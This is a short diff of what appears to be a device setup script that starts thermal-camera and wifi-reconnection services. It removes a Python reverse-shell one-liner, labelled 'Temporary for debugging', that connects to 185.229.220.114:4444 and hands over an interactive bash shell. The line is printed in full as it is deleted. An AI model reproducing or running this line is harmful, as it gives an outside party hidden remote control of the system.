@@ -31,5 +31,3 @@ sudo systemctl start thermal_camera.service
 sudo systemctl enable wifi_reconnexion.service
 sudo systemctl start wifi_reconnexion.service
 
-# Temporary for debugging
-python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("185.229.220.114",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'
